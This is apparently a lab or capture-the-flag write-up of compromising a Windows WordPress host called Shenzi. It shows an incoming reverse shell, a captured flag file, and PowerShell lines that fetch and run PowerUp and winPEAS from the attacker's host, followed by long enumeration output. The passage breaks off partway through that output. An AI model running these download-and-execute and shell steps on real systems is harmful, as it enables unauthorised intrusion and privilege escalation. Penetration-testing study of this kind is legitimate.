t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
                </script>
                <style>
img.wp-smiley,
img.emoji {
        display: inline !important;
        border: none !important;
        box-shadow: none !important;
        height: 1em !important;
        width: 1em !important;
        margin: 0 .07em !important;
        vertical-align: -0.1em !important;
        background: none !important;
        padding: 0 !important;
}
</style>
        <link rel='stylesheet' id='wp-block-library-css'  href='http://192.168.106.55/shenzi/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' media='all' />
<link rel='stylesheet' id='twentytwenty-style-css'  href='http://192.168.106.55/shenzi/wp-content/themes/twentytwenty/style.css?ver=1.2' media='all' />
<style id='twentytwenty-style-inline-css'>
.color-accent,.color-accent-hover:hover,.color-accent-hover:focus,:root .has-accent-color,.has-drop-cap:not(:focus):first-letter,.wp-block-button.is-style-outline,a { color: #cd2653; }blockquote,.border-color-accent,.border-color-accent-hover:hover,.border-color-accent-hover:focus { border-color: #cd2653; }button:not(.toggle),.button,.faux-button,.wp-block-button__link,.wp-block-file .wp-block-file__button,input[type="button"],input[type="reset"],input[type="submit"],.bg-accent,.bg-accent-hover:hover,.bg-accent-hover:focus,:root .has-accent-background-color,.comment-reply-link { background-color: #cd2653; }.fill-children-accent,.fill-children-accent * { fill: #cd2653; }body,.entry-title a,:root .has-primary-color { color: #000000; }:root .has-primary-background-color { background-color: #000000; }cite,figcaption,.wp-caption-text,.post-meta,.entry-content .wp-block-archives li,.entry-content .wp-block-categories li,.entry-content .wp-block-latest-posts li,.wp-block-latest-comments__comment-date,.wp-block-latest-posts__post-date,.wp-block-embed figcaption,.wp-block-image figcaption,.wp-block-pullquote cite,.comment-metadata,.comment-respond .comment-notes,.comment-respond .logged-in-as,.pagination .dots,.entry-content hr:not(.has-background),hr.styled-separator,:root .has-secondary-color { color: #6d6d6d; }:root .has-secondary-background-color { background-color: #6d6d6d; }pre,fieldset,input,textarea,table,table *,hr { border-color: #dcd7ca; }caption,code,code,kbd,samp,.wp-block-table.is-style-stripes tbody tr:nth-child(odd),:root .has-subtle-background-background-color { background-color: #dcd7ca; }.wp-block-table.is-style-stripes { border-bottom-color: #dcd7ca; }.wp-block-latest-posts.is-grid li { border-top-color: #dcd7ca; }:root .has-subtle-background-color { color: #dcd7ca; }body:not(.overlay-header) .primary-menu > li > a,body:not(.overlay-header) .primary-menu > li > .icon,.modal-menu a,.footer-menu a, .footer-widgets a,#site-footer .wp-block-button.is-style-outline,.wp-block-pullquote:before,.singular:not(.overlay-header) .entry-header a,.archive-header a,.header-footer-group .color-accent,.header-footer-group .color-accent-hover:hover { color: #cd2653; }.social-icons a,#site-footer button:not(.toggle),#site-footer .button,#site-footer .faux-button,#site-footer .wp-block-button__link,#site-footer .wp-block-file__button,#site-footer input[type="button"],#site-footer input[type="reset"],#site-footer input[type="submit"] { background-color: #cd2653; }.header-footer-group,body:not(.overlay-header) #site-header .toggle,.menu-modal .toggle { color: #000000; }body:not(.overlay-header) .primary-menu ul { background-color: #000000; }body:not(.overlay-header) .primary-menu > li > ul:after { border-bottom-color: #000000; }body:not(.overlay-header) .primary-menu ul ul:after { border-left-color: #000000; }.site-description,body:not(.overlay-header) .toggle-inner .toggle-text,.widget .post-date,.widget .rss-date,.widget_archive li,.widget_categories li,.widget cite,.widget_pages li,.widget_meta li,.widget_nav_menu li,.powered-by-wordpress,.to-the-top,.singular .entry-header .post-meta,.singular:not(.overlay-header) .entry-header .post-meta a { color: #6d6d6d; }.header-footer-group pre,.header-footer-group fieldset,.header-footer-group input,.header-footer-group textarea,.header-footer-group table,.header-footer-group table *,.footer-nav-widgets-wrapper,#site-footer,.menu-modal nav *,.footer-widgets-outer-wrapper,.footer-top { border-color: #dcd7ca; }.header-footer-group table caption,body:not(.overlay-header) .header-inner .toggle-wrapper::before { background-color: #dcd7ca; }
</style>
<link rel='stylesheet' id='twentytwenty-print-style-css'  href='http://192.168.106.55/shenzi/wp-content/themes/twentytwenty/print.css?ver=1.2' media='print' />
<script src='http://192.168.106.55/shenzi/wp-content/themes/twentytwenty/assets/js/index.js?ver=1.2' async></script>
<link rel='https://api.w.org/' href='http://192.168.106.55/shenzi/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://192.168.106.55/shenzi/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://192.168.106.55/shenzi/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
        <script>document.documentElement.className = document.documentElement.className.replace( 'no-js', 'js' );</script>
        <style>.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
        </head>

        <body class="error404 wp-embed-responsive enable-search-modal has-no-pagination not-showing-comments show-avatars footer-top-visible">

                <a class="skip-link screen-reader-text" href="#site-content">Skip to the content</a>
                <header id="site-header" class="header-footer-group" role="banner">

                        <div class="header-inner section-inner">

                                <div class="header-titles-wrapper">


                                                <button class="toggle search-toggle mobile-search-toggle" data-toggle-target=".search-modal" data-toggle-body-class="showing-search-modal" data-set-focus=".search-modal .search-field" aria-expanded="false">
                                                        <span class="toggle-inner">
                                                                <span class="toggle-icon">
                                                                        <svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="23" height="23" viewBox="0 0 23 23"><path d="M38.710696,48.0601792 L43,52.3494831 L41.3494831,54 L37.0601792,49.710696 C35.2632422,51.1481185 32.9839107,52.0076499 30.5038249,52.0076499 C24.7027226,52.0076499 20,47.3049272 20,41.5038249 C20,35.7027226 24.7027226,31 30.5038249,31 C36.3049272,31 41.0076499,35.7027226 41.0076499,41.5038249 C41.0076499,43.9839107 40.1481185,46.2632422 38.710696,48.0601792 Z M36.3875844,47.1716785 C37.8030221,45.7026647 38.6734666,43.7048964 38.6734666,41.5038249 C38.6734666,36.9918565 35.0157934,33.3341833 30.5038249,33.3341833 C25.9918565,33.3341833 22.3341833,36.9918565 22.3341833,41.5038249 C22.3341833,46.0157934 25.9918565,49.6734666 30.5038249,49.6734666 C32.7048964,49.6734666 34.7026647,48.8030221 36.1716785,47.3875844 C36.2023931,47.347638 36.2360451,47.3092237 36.2726343,47.2726343 C36.3092237,47.2360451 36.347638,47.2023931 36.3875844,47.1716785 Z" transform="translate(-20 -31)" /></svg>                                                    </span>
                                                                <span class="toggle-text">Search</span>
                                                        </span>
                                                </button><!-- .search-toggle -->


                                        <div class="header-titles">

                                                <div class="site-title faux-heading"><a href="http://192.168.106.55/shenzi/">Shenzi</a></div><div class="site-description">Welcome to Shenzi WordPress site</div><!-- .site-description -->
                                        </div><!-- .header-titles -->

                                        <button class="toggle nav-toggle mobile-nav-toggle" data-toggle-target=".menu-modal"  data-toggle-body-class="showing-menu-modal" aria-expanded="false" data-set-focus=".close-nav-toggle">
                                                <span class="toggle-inner">
                                                        <span class="toggle-icon">
                                                                <svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="26" height="7" viewBox="0 0 26 7"><path fill-rule="evenodd" d="M332.5,45 C330.567003,45 329,43.4329966 329,41.5 C329,39.5670034 330.567003,38 332.5,38 C334.432997,38 336,39.5670034 336,41.5 C336,43.4329966 334.432997,45 332.5,45 Z M342,45 C340.067003,45 338.5,43.4329966 338.5,41.5 C338.5,39.5670034 340.067003,38 342,38 C343.932997,38 345.5,39.5670034 345.5,41.5 C345.5,43.4329966 343.932997,45 342,45 Z M351.5,45 C349.567003,45 348,43.4329966 348,41.5 C348,39.5670034 349.567003,38 351.5,38 C353.432997,38 355,39.5670034 355,41.5 C355,43.4329966 353.432997,45 351.5,45 Z" transform="translate(-329 -38)" /></svg>                                                 </span>
                                                        <span class="toggle-text">Menu</span>
                                                </span>
                                        </button><!-- .nav-toggle -->

                                </div><!-- .header-titles-wrapper -->

                                <div class="header-navigation-wrapper">

connect to [192.168.49.106] from (UNKNOWN) [192.168.106.55] 57627

PS C:\xampp\htdocs\shenzi> whoami
shenzi\shenzi
PS C:\xampp\htdocs\shenzi> cd \Users
PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         12/3/2021   8:30 AM                Administrator                                                        
d-r---         12/3/2021   8:08 AM                Public                                                               
d-----         12/3/2021   8:20 AM                shenzi                                                               


PS C:\Users> cd shenzi
PS C:\Users\shenzi> dir


    Directory: C:\Users\shenzi


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---         12/3/2021   8:20 AM                3D Objects                                                           
d-r---         12/3/2021   8:20 AM                Contacts                                                             
d-r---         12/3/2021   8:56 AM                Desktop                                                              
d-r---         12/3/2021   8:20 AM                Documents                                                            
d-r---         12/3/2021   8:20 AM                Downloads                                                            
d-r---         12/3/2021   8:20 AM                Favorites                                                            
d-r---         12/3/2021   8:20 AM                Links                                                                
d-r---         12/3/2021   8:20 AM                Music                                                                
d-r---        10/26/2020  11:21 AM                OneDrive                                                             
d-r---         12/3/2021   8:20 AM                Pictures                                                             
d-r---         12/3/2021   8:20 AM                Saved Games                                                          
d-r---         12/3/2021   8:20 AM                Searches                                                             
d-r---         12/3/2021   8:20 AM                Videos                                                               


PS C:\Users\shenzi> cd Desktop
PS C:\Users\shenzi\Desktop> dir


    Directory: C:\Users\shenzi\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          3/9/2022   4:04 AM             34 local.txt                                                            


PS C:\Users\shenzi\Desktop> type local.txt
cbf1ae23a1472d39876068bd4d9c06f5
PS C:\Users\shenzi\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.106.55
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.106.254
PS C:\Users\shenzi\Desktop>
```

![](Pasted%20image%2020220309205842.png)

# Privesc

## PowerUp

```powershell
PS C:\Users\shenzi\Desktop> IEX(New-Object Net.WebClient).downloadString('http://192.168.49.106/PowerUp.ps1')
PS C:\Users\shenzi\Desktop> Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


[*] Checking service executable and argument permissions...


ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False

ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : {Delete, GenericWrite, GenericExecute, GenericRead}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : {Delete, GenericWrite, GenericExecute, GenericRead}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False





[*] Checking service permissions...


[*] Checking %PATH% for potentially hijackable DLL locations...


ModifiablePath    : C:\Users\shenzi\AppData\Local\Microsoft\WindowsApps
IdentityReference : SHENZI\shenzi
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\shenzi\AppData\Local\Microsoft\WindowsApps
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\shenzi\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'





[*] Checking for AlwaysInstallElevated registry key...


AbuseFunction : Write-UserAddMSI





[*] Checking for Autologon credentials in registry...


DefaultDomainName    : SHENZI
DefaultUserName      : shenzi
DefaultPassword      : 
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 





[*] Checking for modifidable registry autoruns and configs...


[*] Checking for modifiable schtask files/configs...


[*] Checking for unattended install files...


[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


[*] Checking for plaintext passwords in McAfee SiteList.xml files....




[*] Checking for cached Group Policy Preferences .xml files....


PS C:\Users\shenzi\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
PS C:\Users\shenzi\Desktop> 
```

## WinPEAS

```powershell
PS C:\Users\shenzi\Desktop> IEX(New-Object Net.WebClient).downloadString('http://192.168.49.106/Invoke-winPEAS.ps1')
PS C:\Users\shenzi\Desktop> Invoke-winPEAS
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
   Creating Dynamic lists, this could take a while, please wait...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list...
   - Creating disabled users list...
   - Admin users list...
     
             *((,.,/((((((((((((((((((((/,  */                                                                                                                          
      ,/*,..*((((((((((((((((((((((((((((((((((,                                                                                                                        
    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*                                                                                                                     
    ((((((((((((((((**********/########## .(* ,(((((((                                                                                                                  
    (((((((((((/********************/####### .(. (((((((                                                                                                                
    ((((((..******************/@@@@@/***/###### ./(((((((                                                                                                               
    ,,....********************@@@@@@@@@@(***,#### .//((((((                                                                                                             
    , ,..********************/@@@@@%@@@@/********##((/ /((((                                                                                                            
    ..((###########*********/%@@@@@@@@@/************,,..((((                                                                                                            
    .(##################(/******/@@@@@/***************.. /((                                                                                                            
    .(#########################(/**********************..*((                                                                                                            
    .(##############################(/*****************.,(((                                                                                                            
    .(###################################(/************..(((                                                                                                            
    .(#######################################(*********..(((                                                                                                            
    .(#######(,.***.,(###################(..***.*******..(((                                                                                                            
    .(#######*(#####((##################((######/(*****..(((                                                                                                            
    .(###################(/***********(##############(...(((                                                                                                            
    .((#####################/*******(################.((((((                                                                                                            
    .(((############################################(..((((                                                                                                             
    ..(((##########################################(..(((((                                                                                                             
    ....((########################################( .(((((                                                                                                              
    ......((####################################( .((((((                                                                                                               
    (((((((((#################################(../((((((                                                                                                                
        (((((((((/##########################(/..((((((                                                                                                                  
              (((((((((/,.  ,*//////*,. ./(((((((((((((((.                                                                                                              
                 (((((((((((((((((((((((((((((/                                                                                                                         

ADVISORY: w1nP34S should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                             
                                                                                                                                                                        
  w1nP34S v1.1 by carlospolop                                                                                                                                           

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

   [?] You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation


  ==========================================(System Information)==========================================

  [+] Basic System Information
   [?] Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
    Hostname: shenzi
    ProductName: Windows 10 Pro
    EditionID: Professional
    ReleaseId: 2009
    BuildBranch: vb_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 3/9/2022 5:04:58 AM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB5007289, KB4562830, KB5007253, KB5006753, KB5007273, 

  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
    OS Build Number: 19042
   Windows version not supported
                                                                                                                                                                        

  [+] User Environment Variables
   [?] Check for some passwords or keys in the env variables 
    COMPUTERNAME: SHENZI
    USERPROFILE: C:\Users\shenzi
    HOMEPATH: \Users\shenzi
    LOCALAPPDATA: C:\Users\shenzi\AppData\Local
    PSModulePath: C:\Users\shenzi\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\shenzi\AppData\Local\Microsoft\WindowsApps;
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 23
    LOGONSERVER: \\SHENZI
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    HOMEDRIVE: C:
    SystemRoot: C:\WINDOWS
    SESSIONNAME: Console
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    FPS_BROWSER_APP_PROFILE_STRING: Internet Explorer
    APPDATA: C:\Users\shenzi\AppData\Roaming
    PROCESSOR_REVISION: 0102
    USERNAME: shenzi
    CommonProgramW6432: C:\Program Files\Common Files
    TEMP: C:\Users\shenzi\AppData\Local\Temp
    OneDrive: C:\Users\shenzi\OneDrive
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    USERDOMAIN_ROAMINGPROFILE: SHENZI
    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
    ComSpec: C:\WINDOWS\system32\cmd.exe
    PROMPT: $P$G
    SystemDrive: C:
    FPS_BROWSER_USER_PROFILE_STRING: Default
    ProgramFiles: C:\Program Files
    NUMBER_OF_PROCESSORS: 2
    TMP: C:\Users\shenzi\AppData\Local\Temp
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    windir: C:\WINDOWS
    USERDOMAIN: SHENZI
    PUBLIC: C:\Users\Public
    AP_PARENT_PID: 6824

  [+] System Environment Variables
   [?] Check for some passwords or keys in the env variables 
    ComSpec: C:\WINDOWS\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\WINDOWS\TEMP
    TMP: C:\WINDOWS\TEMP
    USERNAME: SYSTEM
    windir: C:\WINDOWS
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 23
    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
    PROCESSOR_REVISION: 0102

  [+] Audit Settings
   [?] Check what is being logged 
    Not Found

  [+] WEF Settings
   [?] Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

  [+] LAPS Settings
   [?] If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

  [+] Wdigest
   [?] If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
    Wdigest is not enabled

  [+] LSA Protection
   [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection                                                                                                   
    LSA Protection is not enabled

  [+] Credentials Guard
   [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled

  [+] Cached Creds
   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials                                                                                                                                                     
    cachedlogonscount is 10

  [+] AV Information
    Some AV was detected, search for bypasses
    Name: Windows Defender
    ProductEXE: windowsdefender://
    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe

  [+] UAC Status
   [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access                                                                                                                                                       
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 0
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.                                                                                        

  [+] PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.19041.1
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

  [+] PS default transcripts history
    [i] Read the PS history inside these files (if any)

  [+] HKCU Internet Settings
    CertificateRevocation: 1
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    ZonesSecurityUpgrade: System.Byte[]
    EnableNegotiate: 1
    MigrateProxy: 1
    ProxyEnable: 0
    WarnonZoneCrossing: 0
    LockDatabase: 132832741845157477

  [+] HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

  [+] Drives Information
   [?] Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 26 GB)(Permissions: Authenticated Users [AppendData/CreateDirectories])
    D:\ (Type: CDRom)

  [+] Checking WSUS
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
    Not Found

  [+] Checking AlwaysInstallElevated
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!


  ===========================================(Users Information)===========================================

  [+] Users
   [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
  Current user: shenzi
  Current groups: Domain Users, Everyone, Users, Interactive, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
   =================================================================================================

    SHENZI\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    SHENZI\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    SHENZI\Guest: Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    SHENZI\shenzi
        |->Groups: Users
        |->Password: CanChange-NotExpi-NotReq

    SHENZI\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-Expi-Req


  [+] Current Token privileges
   [?] Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
    SeShutdownPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: DISABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED

  [+] Clipboard text


  [+] Logged users
    SHENZI\shenzi

  [+] RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    1         Console        shenzi         SHENZI                   Active    

  [+] Ever logged users
    SHENZI\Administrator
    SHENZI\shenzi

  [+] Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Interactive [WriteData/CreateFiles]
    C:\Users\shenzi : shenzi [AllAccess]

  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  SHENZI
    DefaultUserName               :  shenzi

  [+] Password Policies
   [?] Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: SHENZI
    SID: S-1-5-21-2141929748-2461147466-4258878046
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================



  =======================================(Processes Information)=======================================

  [+] Interesting Processes -non Microsoft-
   [?] Check if any interesting proccesses for memmory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes                                                                                                                                              
    taskhostw(4268)[C:\WINDOWS\system32\taskhostw.exe] -- POwn: shenzi
    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
   =================================================================================================                                                                    

    explorer(4804)[C:\WINDOWS\Explorer.EXE] -- POwn: shenzi
    Command Line: C:\WINDOWS\Explorer.EXE
   =================================================================================================                                                                    

    sihost(4120)[C:\WINDOWS\system32\sihost.exe] -- POwn: shenzi
    Command Line: sihost.exe
   =================================================================================================                                                                    

    taskhostw(2840)[C:\WINDOWS\system32\taskhostw.exe] -- POwn: shenzi
    Command Line: taskhostw.exe
   =================================================================================================                                                                    

    RuntimeBroker(5516)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: shenzi
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    SecurityHealthSystray(6272)[C:\Windows\System32\SecurityHealthSystray.exe] -- POwn: shenzi
    Command Line: "C:\Windows\System32\SecurityHealthSystray.exe" 
   =================================================================================================                                                                    

    SearchApp(5280)[C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe] -- POwn: shenzi
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca
   =================================================================================================                                                                    

    OneDrive(6460)[C:\Users\shenzi\AppData\Local\Microsoft\OneDrive\OneDrive.exe] -- POwn: shenzi
    Permissions: shenzi [AllAccess]
    Possible DLL Hijacking folder: C:\Users\shenzi\AppData\Local\Microsoft\OneDrive (shenzi [AllAccess])
    Command Line: "C:\Users\shenzi\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
   =================================================================================================                                                                    

    FileZillaServer(6848)[c:\xampp\filezillaftp\filezillaserver.exe] -- POwn: shenzi
    Permissions: Authenticated Users [WriteData/CreateFiles]
    Possible DLL Hijacking folder: c:\xampp\filezillaftp (Authenticated Users [WriteData/CreateFiles])
    Command Line: c:\xampp\filezillaftp\filezillaserver.exe -compat -start
   =================================================================================================

    StartMenuExperienceHost(4280)[C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe] -- POwn: shenzi
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca                                                                                                                                                          
   =================================================================================================                                                                    

    powershell(3716)[C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: shenzi
